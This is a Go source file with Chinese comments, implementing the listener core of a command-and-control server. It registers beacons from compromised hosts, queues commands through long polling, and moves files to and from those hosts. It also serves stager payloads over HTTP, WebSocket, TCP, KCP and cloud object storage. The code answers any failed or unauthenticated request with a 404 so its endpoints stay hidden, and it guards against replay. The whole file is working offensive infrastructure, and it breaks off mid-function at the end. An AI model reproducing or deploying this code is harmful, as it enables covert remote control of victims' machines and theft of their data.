package c2center

// 单监听器运行时:传输无关处理核 + 各载体接入(三期 §18 起 http/ws/tcp/kcp/oss)。
//
// 处理核(传输无关,HTTP/ws 共用;生命周期仿 proxycenter/pool.go):
//   1. 解封 → ts 时间窗 → nc 防重放 → 会话定位(任何一步失败 = 404,不暴露端点);
//   2. res:逐条 FinishTask(大输出 >256KB 落 <BaseDir>/c2/outputs/task_<id>.txt,表内留 2KB 预览);
//   3. 心跳:经 UpsertSession 刷新 last_seen 并复位 online(dead 会话不复活、立即回 kl);
//   4. 取任务(TakeQueuedTasks),空则长轮询挂起至多 PollWait(默认 25s),期间
//      每 600ms 自查 + 可被 NotifySession 唤醒;
//   5. 响应 meta 由会话行现查派生:sl/jt 取 sleep_sec/jitter_pct,kl=(status=="dead")。
//
// 载体接入(transport_*.go):
//   http/ws:net.Listen + http.Server,信封走 base64 body(ws 是文本消息),一期行为逐字节不变;
//   tcp/kcp:裸 listener + 每连接帧循环(4B big-endian 长度 + 裸密文,首帧必须 reg);
//   oss:无端口,每监听器一个 goroutine 定时 ListObjectsV2 发现请求对象→处理核→写响应对象。

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

// 与契约 §3 对齐的常量。
const (
	// MaxBodyBytes 是信道请求 body 上限(8MB)。
	MaxBodyBytes = 8 << 20
	// FileChunkSize 是文件分片大小(256KB)。
	FileChunkSize = 256 << 10
	// MaxOutputInline 是任务输出走表内的阈值;超过落盘 outputs/。
	MaxOutputInline = 256 << 10
	// OutputPreviewBytes 是大输出落盘后表内保留的预览字节数。
	OutputPreviewBytes = 2048
	// defaultPollWait 是长轮询最长挂起(契约:最多挂 25s)。
	defaultPollWait = 25 * time.Second
	// defaultSweepInterval / defaultSweepGrace 是 Manager 巡检默认值。
	defaultSweepInterval = 30 * time.Second
	defaultSweepGrace    = 2
	// defaultSleepSec / defaultJitterPct 与 schema 会话默认值一致(meta 兜底用)。
	defaultSleepSec  = 10
	defaultJitterPct = 20
	// takeTaskLimit 是单次长轮询最多取走的任务数。
	takeTaskLimit = 16
	// idlePollStep 是长轮询期间的兜底自查间隔(NotifySession 未接时保证及时性)。
	idlePollStep = 600 * time.Millisecond
)

// channelServer 是一个监听器的运行时实例(传输无关:同一处理核,载体接入在
// start() 按 proto 分派到各 transport_*.go)。
type channelServer struct {
	mgr *Manager
	l   Listener // 启动时的快照;改配置(端口/url_path/密钥)需重启监听器
	key []byte

	ln     net.Listener // http/ws/tcp/kcp 共用(http/ws 由 server.Serve 托管)
	server *http.Server // 仅 http/ws
	cfg    *TransportConfig
	ctx    context.Context
	cancel context.CancelFunc

	stopOnce sync.Once

	nonces *nonceTable // sid(reg 用 uid)→ 已用 nc 的 LRU

	notifyMu sync.Mutex
	notify   map[int64]chan struct{} // sessionID → 任务到达唤醒槽
}

// newChannelServer 装配监听器运行时(不监听)。
func newChannelServer(mgr *Manager, l Listener, key []byte, parent context.Context) (*channelServer, error) {
	if strings.TrimSpace(l.URLPath) != l.URLPath || strings.Contains(l.URLPath, "/") {
		return nil, fmt.Errorf("url_path 非法:%q(不能含 / 或首尾空白)", l.URLPath)
	}
	if l.BindHost == "" {
		l.BindHost = "0.0.0.0"
	}
	if l.Proto == "" {
		l.Proto = ProtoHTTP
	}
	ctx, cancel := context.WithCancel(parent)
	return &channelServer{
		mgr:    mgr,
		l:      l,
		key:    append([]byte(nil), key...),
		ctx:    ctx,
		cancel: cancel,
		nonces: newNonceTable(),
		notify: map[int64]chan struct{}{},
	}, nil
}

// start 按协议拉起载体(端口被占/配置缺失返回含系统原文的明确错误)。
func (s *channelServer) start() error {
	switch s.l.Proto {
	case ProtoHTTP, ProtoWS, "":
		return s.startHTTP()
	case ProtoTCP:
		return s.startFrameTCP()
	case ProtoKCP:
		return s.startKCP()
	case ProtoOSS:
		return s.startOSS()
	default:
		return fmt.Errorf("不支持的监听器协议: %q", s.l.Proto)
	}
}

// transportOf 会话 transport 标注口径(一期行回落 http)。
func (s *channelServer) transportOf() string {
	if s.l.Proto == "" {
		return ProtoHTTP
	}
	return s.l.Proto
}

// listenAddr 监听地址(bind_host:port;port=0 时由内核分配)。
func (s *channelServer) listenAddr() string {
	return net.JoinHostPort(s.l.BindHost, strconv.Itoa(s.l.Port))
}

// startHTTP 拉起 http/ws 监听(ws 在 ServeHTTP 里对 /<url_path>/e 的 GET 做 upgrade)。
func (s *channelServer) startHTTP() error {
	ln, err := net.Listen("tcp", s.listenAddr())
	if err != nil {
		return fmt.Errorf("监听 %s 失败: %w", s.listenAddr(), err)
	}
	s.ln = ln
	s.server = &http.Server{
		Handler:           s,
		ReadHeaderTimeout: 30 * time.Second,
		IdleTimeout:       120 * time.Second,
	}
	go func() {
		if serr := s.server.Serve(ln); serr != nil && serr != http.ErrServerClosed {
			select {
			case <-s.ctx.Done():
			default:
				s.mgr.logf("监听器 «%s»(#%d) 服务退出: %v", s.l.Name, s.l.ID, serr)
			}
		}
	}()
	return nil
}

// stop 关闭监听器(幂等):先取消运行时 ctx(让长轮询/oss 扫描/帧循环立即返回),
// 再 Shutdown http(ws/tcp/kcp 裸 listener 直接 Close)。
func (s *channelServer) stop() {
	s.stopOnce.Do(func() {
		s.cancel()
		if s.server != nil {
			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
			defer cancel()
			_ = s.server.Shutdown(ctx)
		}
		if s.ln != nil {
			_ = s.ln.Close()
		}
	})
}

// addr 返回实际监听地址(端口为 0 时是内核分配的真实端口;oss 无监听 = 空串)。
func (s *channelServer) addr() string {
	if s.ln == nil {
		return ""
	}
	return s.ln.Addr().String()
}

// channelPath 是信道路径:/<url_path>/e(url_path 为空时即 /e)。
func (s *channelServer) channelPath() string {
	base := strings.Trim(s.l.URLPath, "/")
	if base == "" {
		return "/e"
	}
	return "/" + base + "/e"
}

// ServeHTTP 手工路由(http/ws 载体):只认 /<url_path>/e 与 /<url_path>/p/<token>,
// 其余一律 404。ws 载体的信道是 /e 上的 GET upgrade;POST /e 不再受理(404 同伪装)。
func (s *channelServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	base := strings.Trim(s.l.URLPath, "/")
	rest := strings.Trim(r.URL.Path, "/")
	if base != "" {
		if !strings.HasPrefix(rest, base+"/") {
			http.NotFound(w, r)
			return
		}
		rest = rest[len(base)+1:]
	}
	isHTTP := s.l.Proto == ProtoHTTP || s.l.Proto == ""
	switch {
	case rest == "e" && r.Method == http.MethodPost && isHTTP:
		s.handleEnvelope(w, r)
	case rest == "e" && r.Method == http.MethodGet && s.l.Proto == ProtoWS:
		s.handleWS(w, r)
	case strings.HasPrefix(rest, "p/") && r.Method == http.MethodGet && (isHTTP || s.l.Proto == ProtoWS):
		s.handleDelivery(w, r, strings.TrimPrefix(rest, "p/"))
	default:
		http.NotFound(w, r)
	}
}

// ---- 处理核(传输无关) ----

// handleEnvelope http 载体入口:读 body → base64 解码 → 处理核 → base64 响应。
// 一期行为逐字节不变(404 用 http.NotFound,400/500 用 http.Error 同文本)。
func (s *channelServer) handleEnvelope(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, MaxBodyBytes))
	if err != nil {
		http.NotFound(w, r)
		return
	}
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(string(body)))
	if err != nil {
		http.NotFound(w, r)
		return
	}
	out := s.processEnvelope(raw, frameCtx{wait: true})
	if out.code != 0 {
		if out.code == http.StatusNotFound {
			http.NotFound(w, r)
		} else {
			http.Error(w, out.msg, out.code)
		}
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	_, _ = w.Write([]byte(base64.StdEncoding.EncodeToString(out.body)))
}

// serveConn 帧式连接循环(tcp/kcp/ws/正向共用):解帧 → 处理核 → 回帧,直到
// EOF/超时/错误。首帧必须是 reg(处理核内强制);任何非 200 裁决不回明文直接断连
// (与 http 的 404 同一伪装哲学)。
// afterHandshake > 0 表示首帧已由 handshakeBind 消费(正向连接),帧循环直接
// 以「非首帧」语义继续。
func (s *channelServer) serveConn(c Conn, bind bool, skipFirst ...bool) {
	defer func() { _ = c.Close() }()
	first := len(skipFirst) == 0 || !skipFirst[0]
	for {
		raw, err := c.ReadFrame()
		if err != nil {
			return
		}
		out := s.processEnvelope(raw, frameCtx{first: first, bind: bind, wait: true})
		if out.code != 0 {
			return
		}
		if err := c.WriteFrame(out.body); err != nil {
			return
		}
		first = false
	}
}

// handshakeBind 正向连接的首帧握手(ConnectBind 用):读首帧(必须是 reg)→ 处理核
// → 回 ack,同步返回新会话 id。失败原样报错(连接由调用方关闭)。
func (s *channelServer) handshakeBind(c Conn) (int64, error) {
	raw, err := c.ReadFrame()
	if err != nil {
		return 0, fmt.Errorf("读取正向 beacon 首帧失败: %w", err)
	}
	out := s.processEnvelope(raw, frameCtx{first: true, bind: true, wait: true})
	if out.code != 0 || out.body == nil {
		return 0, fmt.Errorf("正向首帧握手被拒(必须是合法 reg;code=%d %s)", out.code, out.msg)
	}
	if out.sessID <= 0 {
		return 0, fmt.Errorf("正向首帧不是 reg(协议错误)")
	}
	if err := c.WriteFrame(out.body); err != nil {
		return 0, fmt.Errorf("回 ack 失败: %w", err)
	}
	return out.sessID, nil
}

// processEnvelope 处理核:解密→信封解析→分发(reg/poll/res/file)→加密。
// code=0 时 body 是响应密文;非 0 为 HTTP 语义错误(http 传输按码回文本,
// 帧式传输直接断连)。sessID 仅 reg 成功时携带(正向连接 API 拿它建会话返回值)。
func (s *channelServer) processEnvelope(raw []byte, fx frameCtx) frameReply {
	plain, err := Open(s.key, raw)
	if err != nil {
		return frameReply{code: http.StatusNotFound}
	}
	var env RequestEnvelope
	if err := json.Unmarshal(plain, &env); err != nil {
		return frameReply{code: http.StatusBadRequest, msg: "bad envelope"}
	}
	if !freshTS(env.TS, time.Now()) {
		return frameReply{code: http.StatusNotFound} // 时间窗越界:与密钥错误同样处理
	}

	// 帧式连接首帧必须是 reg(§18);http 请求间无状态不受此限。
	if fx.first && env.Type != TypeReg {
		return frameReply{code: http.StatusBadRequest, msg: "first frame must be reg"}
	}

	if env.Type == TypeReg {
		return s.processReg(&env, fx)
	}
	if env.Type == TypeStageGet {
		return s.processStageGet(&env)
	}

	if env.SID == "" {
		return frameReply{code: http.StatusBadRequest, msg: "missing sid"}
	}
	sess, err := s.mgr.store.GetSessionBySID(env.SID)
	if err != nil || sess == nil {
		return frameReply{code: http.StatusNotFound} // 未知 sid:不暴露存在性
	}
	if !s.nonces.seen(sess.SID, env.NC) {
		return frameReply{code: http.StatusNotFound} // 重放
	}
	if sess.Status == StatusDead {
		// 终止会话:不心跳、不派任务,立即回 kl=true 让 beacon 退出。
		body, serr := s.sealEnvelope(env.Type, RespMeta{SleepSec: sess.SleepSec, JitterPct: sess.JitterPct, Kill: true}, emptyData(env.Type))
		if serr != nil {
			return frameReply{code: http.StatusInternalServerError, msg: "internal error"}
		}
		return frameReply{body: body}
	}

	switch env.Type {
	case TypePoll, TypeRes:
		return s.processPollRes(&env, sess, fx.wait)
	case TypeFile:
		return s.processFile(&env, sess)
	default:
		return frameReply{code: http.StatusBadRequest, msg: "unknown type"}
	}
}

// emptyData 给终止会话的响应一个类型匹配的空载荷。
func emptyData(typ string) any {
	switch typ {
	case TypeTasks:
		return TasksPayload{Tasks: []TaskOut{}}
	default:
		return PushPayload{}
	}
}

// sealEnvelope 加密一个响应信封(处理核出口;载体层决定怎么上线路)。
func (s *channelServer) sealEnvelope(typ string, meta RespMeta, d any) ([]byte, error) {
	plain, err := json.Marshal(ResponseEnvelope{Type: typ, Meta: meta, Data: d})
	if err != nil {
		return nil, err
	}
	return Seal(s.key, plain)
}

// processReg 处理注册:UpsertSession 幂等建/复活会话,回 ack 带 sid。
// 会话行带 transport 标注;正向连接(fx.bind)在 meta.direction 标注 bind(§18)。
func (s *channelServer) processReg(env *RequestEnvelope, fx frameCtx) frameReply {
	if len(env.Data) == 0 {
		return frameReply{code: http.StatusBadRequest, msg: "missing reg payload"}
	}
	var rg RegPayload
	if err := json.Unmarshal(env.Data, &rg); err != nil {
		return frameReply{code: http.StatusBadRequest, msg: "bad reg payload"}
	}
	if rg.UID == "" {
		return frameReply{code: http.StatusBadRequest, msg: "missing uid"}
	}
	if !s.nonces.seen("uid:"+rg.UID, env.NC) {
		return frameReply{code: http.StatusNotFound} // reg 无 sid,防重放按 uid 记账
	}
	sid, err := newSID()
	if err != nil {
		s.mgr.logf("生成 sid 失败: %v", err)
		return frameReply{code: http.StatusInternalServerError, msg: "internal error"}
	}
	// reg 允许复活(含 dead):listener_id+beacon_uid 幂等是契约语义。
	id, err := s.mgr.store.UpsertSession(SessionInput{
		ListenerID: s.l.ID,
		BeaconUID:  rg.UID,
		SID:        sid,
		Hostname:   rg.Hostname,
		Username:   rg.Username,
		Elevated:   rg.Elevated,
		OS:         rg.OS,
		Arch:       rg.Arch,
		LocalIPs:   rg.IP,
		PID:        rg.PID,
		Process:    rg.Process,
		Transport:  s.transportOf(),
		Direction:  bindDirectionOf(fx.bind),
	})
	if err != nil {
		s.mgr.logf("会话注册失败: %v", err)
		return frameReply{code: http.StatusInternalServerError, msg: "internal error"}
	}
	sess, err := s.mgr.store.GetSession(id)
	if err != nil || sess == nil {
		s.mgr.logf("会话注册后读取失败: %v", err)
		return frameReply{code: http.StatusInternalServerError, msg: "internal error"}
	}
	body, serr := s.sealEnvelope(TypeAck, metaFromSession(sess), AckPayload{SID: sid})
	if serr != nil {
		return frameReply{code: http.StatusInternalServerError, msg: "internal error"}
	}
	return frameReply{body: body, sessID: id}
}

// bindDirectionOf bind 连接的会话方向标注(空 = reverse,不写 meta)。
func bindDirectionOf(bind bool) string {
	if bind {
		return "bind"
	}
	return ""
}

// processStageGet 处理 stager 的 stage 拉取(§19,stager 不是会话):无 sid,与 reg
// 同类对待——防重放按 "stage:"+token 记账;载荷必须存在且属于本监听器;stage 分片
// 经 StageDataOpener 回调供给(server 适配,回调内再做 artifact/staged 白名单校验)。
// 任何失败一律 404 语义(不暴露端点/载荷存在性)。
func (s *channelServer) processStageGet(env *RequestEnvelope) frameReply {
	if len(env.Data) == 0 {
		return frameReply{code: http.StatusNotFound}
	}
	var sg StageGetPayload
	if err := json.Unmarshal(env.Data, &sg); err != nil || strings.TrimSpace(sg.Token) == "" {
		return frameReply{code: http.StatusNotFound}
	}
	if !s.nonces.seen("stage:"+sg.Token, env.NC) {
		return frameReply{code: http.StatusNotFound} // 重放
	}
	p, err := s.mgr.store.GetPayloadByToken(sg.Token)
	if err != nil || p == nil || p.ListenerID != s.l.ID {
		return frameReply{code: http.StatusNotFound}
	}
	if s.mgr.StageDataOpener == nil {
		return frameReply{code: http.StatusNotFound} // staged 信道未接线
	}
	data, eof, total, err := s.mgr.StageDataOpener(sg.Token, sg.Offset, sg.Length)
	if err != nil {
		return frameReply{code: http.StatusNotFound}
	}
	body, serr := s.sealEnvelope(TypeStageData, RespMeta{SleepSec: defaultSleepSec, JitterPct: defaultJitterPct},
		StageDataPayload{Data: data, EOF: eof, Total: total})
	if serr != nil {
		return frameReply{code: http.StatusInternalServerError, msg: "internal error"}
	}
	return frameReply{body: body}
}

// processPollRes 处理 poll/res(可合并):先收结果,再心跳,再取任务(oss 载体
// wait=false:对象队列无挂起语义,空队列立即返回)。
func (s *channelServer) processPollRes(env *RequestEnvelope, sess *Session, wait bool) frameReply {
	if env.Type == TypeRes && len(env.Data) > 0 {
		var rp ResPayload
		if err := json.Unmarshal(env.Data, &rp); err != nil {
			return frameReply{code: http.StatusBadRequest, msg: "bad res payload"}
		}
		for i := range rp.Results {
			s.finishOne(sess, &rp.Results[i])
		}
	}

	// 心跳:经 UpsertSession 刷新 last_seen 并复位 online(此处会话必非 dead)。
	if cur, err := s.heartbeat(sess); err == nil && cur != nil {
		sess = cur
	} else if err != nil {
		s.mgr.logf("会话 #%d 心跳刷新失败: %v", sess.ID, err)
	}

	var tasks []Task
	if wait {
		tasks = s.takeWithWait(sess)
	} else {
		tasks, _ = s.mgr.store.TakeQueuedTasks(sess.ID, takeTaskLimit)
	}
	out := make([]TaskOut, 0, len(tasks)) // 永不为 nil
	for i := range tasks {
		out = append(out, TaskOut{ID: tasks[i].ID, Kind: tasks[i].Kind, Input: tasks[i].Input})
	}
	// 响应前现查会话:sleep 调整/终止要在这轮就生效。
	if cur, err := s.mgr.store.GetSessionBySID(sess.SID); err == nil && cur != nil {
		sess = cur
	}
	if sess.Status == StatusDead {
		body, serr := s.sealEnvelope(TypeTasks, metaFromSession(sess), TasksPayload{Tasks: []TaskOut{}})
		if serr != nil {
			return frameReply{code: http.StatusInternalServerError, msg: "internal error"}
		}
		return frameReply{body: body}
	}
	body, serr := s.sealEnvelope(TypeTasks, metaFromSession(sess), TasksPayload{Tasks: out})
	if serr != nil {
		return frameReply{code: http.StatusInternalServerError, msg: "internal error"}
	}
	return frameReply{body: body}
}

// finishOne 收一条任务结果:校验归属与终态幂等,大输出落盘,回填任务。
func (s *channelServer) finishOne(sess *Session, rs *ResResult) {
	if rs.TaskID <= 0 {
		return
	}
	t, err := s.mgr.store.GetTask(rs.TaskID)
	if err != nil || t == nil {
		s.mgr.logf("结果回填跳过:任务 #%d 不存在", rs.TaskID)
		return
	}
	if t.SessionID != sess.ID {
		s.mgr.logf("结果回填跳过:任务 #%d 不属于会话 #%d", rs.TaskID, sess.ID)
		return
	}
	if t.Status == TaskDone || t.Status == TaskError {
		return // 幂等:beacon 重发结果不覆盖
	}
	status := rs.Status
	if status != TaskDone && status != TaskError {
		status = TaskError
	}
	preview, path := s.spillOutput(t.ID, rs.Output)
	if err := s.mgr.store.FinishTask(t.ID, status, preview, path, int64(len(rs.Output)), rs.ErrText); err != nil {
		s.mgr.logf("回填任务 #%d 失败: %v", t.ID, err)
	}
}

// spillOutput 决定输出去向:≤256KB 存表内全文;超过落 <BaseDir>/c2/outputs/task_<id>.txt,
// 表内只留 2KB 预览(BaseDir 为空或落盘失败则只留预览,大小仍回真实值)。
func (s *channelServer) spillOutput(taskID int64, out []byte) (preview, path string) {
	if len(out) <= MaxOutputInline {
		return string(out), ""
	}
	preview = clipString(out, OutputPreviewBytes)
	if s.mgr.BaseDir == "" {
		return preview, ""
	}
	path = filepath.Join(s.mgr.BaseDir, "c2", "outputs", fmt.Sprintf("task_%d.txt", taskID))
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		s.mgr.logf("创建输出目录失败: %v", err)
		return preview, ""
	}
	if err := os.WriteFile(path, out, 0o644); err != nil {
		s.mgr.logf("写任务 #%d 大输出失败: %v", taskID, err)
		return preview, ""
	}
	return preview, path
}

// clipString 截取前 n 字节。
func clipString(b []byte, n int) string {
	if len(b) <= n {
		return string(b)
	}
	return string(b[:n])
}

// heartbeat 经 UpsertSession 刷新心跳(dead 已在上游挡住,不会走到这里)。
func (s *channelServer) heartbeat(sess *Session) (*Session, error) {
	if _, err := s.mgr.store.UpsertSession(SessionInput{
		ListenerID: sess.ListenerID,
		BeaconUID:  sess.BeaconUID,
		SID:        sess.SID,
		Hostname:   sess.Hostname,
		Username:   sess.Username,
		Elevated:   sess.Elevated,
		OS:         sess.OS,
		Arch:       sess.Arch,
		LocalIPs:   sess.LocalIPs,
		PID:        sess.PID,
		Process:    sess.Process,
	}); err != nil {
		return sess, err
	}
	return s.mgr.store.GetSessionBySID(sess.SID)
}

// takeWithWait 取任务;队列空则长轮询挂起至多 PollWait(默认 25s),期间每 600ms
// 兜底自查、可被 NotifySession 唤醒、会话置 dead 时提前返回。
func (s *channelServer) takeWithWait(sess *Session) []Task {
	deadline := time.Now().Add(s.mgr.PollWait)
	wake := s.registerNotify(sess.ID)
	defer s.removeNotify(sess.ID, wake)
	for {
		tasks, err := s.mgr.store.TakeQueuedTasks(sess.ID, takeTaskLimit)
		if err == nil && len(tasks) > 0 {
			return tasks
		}
		if cur, cerr := s.mgr.store.GetSessionBySID(sess.SID); cerr == nil && cur != nil && cur.Status == StatusDead {
			*sess = *cur
			return nil
		}
		remaining := time.Until(deadline)
		if remaining <= 0 {
			return nil
		}
		if remaining > idlePollStep {
			remaining = idlePollStep
		}
		select {
		case <-s.ctx.Done():
			return nil
		case <-wake:
		case <-time.After(remaining):
		}
	}
}

// registerNotify 登记长轮询唤醒槽。
func (s *channelServer) registerNotify(sessionID int64) <-chan struct{} {
	ch := make(chan struct{}, 1)
	s.notifyMu.Lock()
	s.notify[sessionID] = ch
	s.notifyMu.Unlock()
	return ch
}

// removeNotify 注销唤醒槽(仅当还是自己登记的那个)。
func (s *channelServer) removeNotify(sessionID int64, ch <-chan struct{}) {
	s.notifyMu.Lock()
	if s.notify[sessionID] == ch {
		delete(s.notify, sessionID)
	}
	s.notifyMu.Unlock()
}

// wakeSession 唤醒某会话挂起中的长轮询。
func (s *channelServer) wakeSession(sessionID int64) {
	s.notifyMu.Lock()
	ch := s.notify[sessionID]
	s.notifyMu.Unlock()
	if ch != nil {
		select {
		case ch <- struct{}{}:
		default:
		}
	}
}

// ---- 文件通道 ----

// processFile 分发 ls/pull/push(处理核出口:一律 frameReply)。
func (s *channelServer) processFile(env *RequestEnvelope, sess *Session) frameReply {
	if len(env.Data) == 0 {
		return frameReply{code: http.StatusBadRequest, msg: "missing file payload"}
	}
	var fp FilePayload
	if err := json.Unmarshal(env.Data, &fp); err != nil {
		return frameReply{code: http.StatusBadRequest, msg: "bad file payload"}
	}
	switch fp.Action {
	case "ls":
		return s.fileLs(sess, &fp)
	case "pull":
		return s.filePull(sess, &fp)
	case "push":
		return s.filePush(sess, &fp)
	default:
		return frameReply{code: http.StatusBadRequest, msg: "unknown file action"}
	}
}

// fileLs 处理目录条目上报:entries JSON 字节级直通回响应,同时把规范数组记为该
// 会话最老的 sent files_list 任务的输出(任务在收到 ls 时收尾)。
func (s *channelServer) fileLs(sess *Session, fp *FilePayload) frameReply {
	entries := normalizeEntries(fp.Entries)
	if tasks, err := s.mgr.store.ListTasks(sess.ID, 0, 64); err == nil {
		for i := range tasks {
			t := &tasks[i]
			if t.Kind == "files_list" && t.Status == TaskSent {
				if ferr := s.mgr.store.FinishTask(t.ID, TaskDone, string(entries), "", int64(len(entries)), ""); ferr != nil {
					s.mgr.logf("回填 files_list 任务 #%d 失败: %v", t.ID, ferr)
				}
				break
			}
		}
	}
	if cur, err := s.mgr.store.GetSessionBySID(sess.SID); err == nil && cur != nil {
		sess = cur
	}
	body, err := s.sealEnvelope(TypeFile, metaFromSession(sess), json.RawMessage(`{"es":`+string(entries)+`}`))
	if err != nil {
		return frameReply{code: http.StatusInternalServerError, msg: "internal error"}
	}
	return frameReply{body: body}
}

// normalizeEntries 把 ls 请求里的 es 规范成 JSON 数组字节(接受数组或 {es:[...]} 包装;
// 非法输入回落 [])。
func normalizeEntries(raw json.RawMessage) json.RawMessage {
	trimmed := bytes.TrimSpace(raw)
	if len(trimmed) > 0 && trimmed[0] == '[' && json.Valid(trimmed) {
		return json.RawMessage(trimmed)
	}
	var wrapper struct {
		ES json.RawMessage `json:"es"`
	}
	if err := json.Unmarshal(trimmed, &wrapper); err == nil {
		inner := bytes.TrimSpace(wrapper.ES)
		if len(inner) > 0 && inner[0] == '[' && json.Valid(inner) {
			return json.RawMessage(inner)
		}
	}
	return json.RawMessage("[]")
}

// uploadsBlobPath 是 up 方向的平台侧 blob(server API 写,c2center 只读)。
func (s *channelServer) uploadsBlobPath(transferID int64) string {
	return filepath.Join(s.mgr.BaseDir, "c2", "uploads", strconv.FormatInt(transferID, 10)+".bin")
}

// downloadsBlobPath 是 down 方向的产物文件(c2center 只写,server API 只读)。
func (s *channelServer) downloadsBlobPath(transferID int64) string {
	return filepath.Join(s.mgr.BaseDir, "c2", "downloads", strconv.FormatInt(transferID, 10)+".bin")
}

// filePull 处理 upload 的分片拉取:从 uploads/<tf>.bin 读 [of, of+ln) 返回,发完
// 最后一片时把传输置 done。uploads 只读:仅 up 方向传输可 pull。
func (s *channelServer) filePull(sess *Session, fp *FilePayload) frameReply {
	tr, err := s.mgr.store.GetTransfer(fp.TransferID)
	if err != nil || tr == nil {
		return frameReply{code: http.StatusBadRequest, msg: "transfer 不存在"}
	}
	if tr.SessionID != sess.ID {
		return frameReply{code: http.StatusBadRequest, msg: "transfer 不属于该会话"}
	}
	if tr.Direction != DirectionUp {
		return frameReply{code: http.StatusBadRequest, msg: "仅 up 传输可 pull"}
	}
	if s.mgr.BaseDir == "" {
		return frameReply{code: http.StatusInternalServerError, msg: "未配置 BaseDir"}
	}
	f, err := os.Open(s.uploadsBlobPath(tr.ID))
	if err != nil {
		return frameReply{code: http.StatusBadRequest, msg: "blob 不存在"}
	}
	defer f.Close()
	st, err := f.Stat()
	if err != nil {
		return frameReply{code: http.StatusInternalServerError, msg: "blob 不可读"}
	}
	offset := fp.Offset
	if offset < 0 {
		offset = 0
	}
	if offset > st.Size() {
		offset = st.Size()
	}
	length := fp.Length
	if length <= 0 || length > FileChunkSize {
		length = FileChunkSize
	}
	if offset+length > st.Size() {
		length = st.Size() - offset
	}
	buf := make([]byte, length)
	if _, err := f.ReadAt(buf, offset); err != nil && err != io.EOF {
		return frameReply{code: http.StatusInternalServerError, msg: "blob 读取失败"}
	}
	eof := offset+length >= st.Size()
	newStatus := "running"
	if eof {
		newStatus = "done"
	}
	if uerr := s.mgr.store.UpdateTransfer(tr.ID, newStatus, offset+length, -1, "", ""); uerr != nil {
		s.mgr.logf("更新传输 #%d 失败: %v", tr.ID, uerr)
	}
	if cur, cerr := s.mgr.store.GetSessionBySID(sess.SID); cerr == nil && cur != nil {
		sess = cur
	}
	body, err := s.sealEnvelope(TypeFile, metaFromSession(sess), PullPayload{Data: buf, EOF: eof})
	if err != nil {
		return frameReply{code: http.StatusInternalServerError, msg: "internal error"}
	}
	return frameReply{body: body}
}

// filePush 处理 download 的分片推送:把数据写到 downloads/<tf>.bin 的 of 偏移,
// eof 时传输收尾(done + local_path)。downloads 只写:仅 down 方向传输可 push。
func (s *channelServer) filePush(sess *Session, fp *FilePayload) frameReply {
	tr, err := s.mgr.store.GetTransfer(fp.TransferID)
	if err != nil || tr == nil {
		return frameReply{code: http.StatusBadRequest, msg: "transfer 不存在"}
	}
	if tr.SessionID != sess.ID {
		return frameReply{code: http.StatusBadRequest, msg: "transfer 不属于该会话"}
	}
	if tr.Direction != DirectionDown {
		return frameReply{code: http.StatusBadRequest, msg: "仅 down 传输可 push"}
	}
	if s.mgr.BaseDir == "" {
		return frameReply{code: http.StatusInternalServerError, msg: "未配置 BaseDir"}
	}
	if fp.Offset < 0 {
		return frameReply{code: http.StatusBadRequest, msg: "偏移非法"}
	}
	path := s.downloadsBlobPath(tr.ID)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return frameReply{code: http.StatusInternalServerError, msg: "blob 目录创建失败"}
	}
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return frameReply{code: http.StatusInternalServerError, msg: "blob 打开失败"}
	}
	defer f.Close()
	if len(fp.Data) > 0 {
		if _, err := f.WriteAt(fp.Data, fp.Offset); err != nil {
			return frameReply{code: http.StatusInternalServerError, msg: "blob 写入失败"}
		}
	}
	doneSize := fp.Offset + int64(len(fp.Data))
	if fp.EOF {
		if uerr := s.mgr.store.UpdateTransfer(tr.ID, "done", doneSize, fp.Length, path, ""); uerr != nil {
			s.mgr.logf("更新传输 #%d 失败: %v", tr.ID, uerr)
		}
	} else if uerr := s.mgr.store.UpdateTransfer(tr.ID, "running", doneSize, fp.Length, "", ""); uerr != nil {
		s.mgr.logf("更新传输 #%d 失败: %v", tr.ID, uerr)
	}
	if cur, cerr := s.mgr.store.GetSessionBySID(sess.SID); cerr == nil && cur != nil {
		sess = cur
	}
	body, err := s.sealEnvelope(TypeFile, metaFromSession(sess), PushPayload{})
	if err != nil {
		return frameReply{code: http.StatusInternalServerError, msg: "internal error"}
	}
	return frameReply{body: body}
}

// ---- 载荷投递 ----

// handleDelivery 处理 GET /<url_path>/p/<token>:按 token 找载荷,从
// <BaseDir>/c2/payloads/ 读出字节返回(免鉴权端点,token 即凭据;任何失败一律 404)。
func (s *channelServer) handleDelivery(w http.ResponseWriter, r *http.Request, token string) {
	if token == "" || len(token) > 128 {
		http.NotFound(w, r)
		return
	}
	p, err := s.mgr.store.GetPayloadByToken(token)
	if err != nil || p == nil {
		http.NotFound(w, r)
		return
	}
	if p.ListenerID != s.l.ID {
		http.NotFound(w, r) // 载荷不属于本监听器
		return
	}
	data := s.readPayloadFile(p)
	if data == nil {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
	_, _ = w.Write(data)
}

// readPayloadFile 按 server 侧约定尝试读载荷文件。约定优先级(见最终报告):
// <token>、<id>、<id>.<ext>、<id>_<filename>(推荐 <id>_<filename>,带数字 id)。
func (s *channelServer) readPayloadFile(p *Payload) []byte {
	if s.mgr.BaseDir == "" {
		return nil
	}
	dir := filepath.Join(s.mgr.BaseDir, "c2", "payloads")
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	id := strconv.FormatInt(p.ID, 10)
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if name == p.Token || name == id ||
			strings.HasPrefix(name, id+".") || strings.HasPrefix(name, id+"_") {
			data, rerr := os.ReadFile(filepath.Join(dir, name))
			if rerr == nil {
				return data
			}
		}
	}
	return nil
}

// ---- 公共 ----

// newSID 生成 32 hex 的会话令牌。
func newSID() (string, error) {
	b := make([]byte, 16)
